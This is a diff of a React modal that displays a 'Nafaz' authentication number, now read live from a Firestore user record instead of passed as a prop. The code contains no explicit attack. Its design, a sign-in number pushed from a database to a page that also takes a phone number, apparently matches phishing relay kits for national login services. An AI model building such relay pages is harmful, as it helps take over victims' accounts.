@@ -1,20 +1,59 @@
+"use client";
+
 import { useState, useEffect } from "react";
+import { doc, onSnapshot } from "firebase/firestore";
+import { db } from "../apis/firebase";
 
 interface ModalProps {
   isOpen: boolean;
   onClose: () => void;
-  auth_number: string;
+  userId: string; // User ID to fetch the correct document
   phone: string;
 }
 
 export default function NafazModal({
   isOpen,
   onClose,
-  auth_number,
+  userId,
   phone,
 }: ModalProps) {
   const [timeLeft, setTimeLeft] = useState(60);
+  const [auth_number, setAuthNumber] = useState<string>("");
+  const [loading, setLoading] = useState(true);
 
+  // Fetch Nafaz PIN from Firestore and listen for changes
+  useEffect(() => {
+    if (!isOpen || !userId) return;
+
+    setLoading(true);
+
+    // Set up real-time listener to the user's document in Firestore
+    const userDocRef = doc(db, "users", userId);
+
+    const unsubscribe = onSnapshot(
+      userDocRef,
+      (docSnapshot) => {
+        if (docSnapshot.exists()) {
+          const userData = docSnapshot.data();
+          // Assuming the PIN is stored in a field called 'nafaz_pin'
+          const pin = userData.nafaz_pin || "";
+          setAuthNumber(pin);
+        } else {
+          console.error("User document not found");
+        }
+        setLoading(false);
+      },
+      (error) => {
+        console.error("Error fetching Nafaz PIN:", error);
+        setLoading(false);
+      }
+    );
+
+    // Clean up the listener when component unmounts or modal closes
+    return () => unsubscribe();
+  }, [isOpen, userId]);
+
+  // Timer logic
   useEffect(() => {
     if (!isOpen) {
       setTimeLeft(60);
@@ -80,9 +119,13 @@ export default function NafazModal({
             </span>
 
             <div className="w-24 h-24 rounded-xl flex items-center justify-center mx-auto border-2 border-[#3a9f8c]">
-              <span className="text-4xl font-medium text-[#3a9f8c]">
-                {auth_number}
-              </span>
+              {loading ? (
+                <div className="animate-pulse h-8 w-16 bg-gray-200 rounded"></div>
+              ) : (
+                <span className="text-4xl font-medium text-[#3a9f8c]">
+                  {auth_number}
+                </span>
+              )}
             </div>
 
             <div className="mt-8 leading-relaxed max-w-md mx-auto">
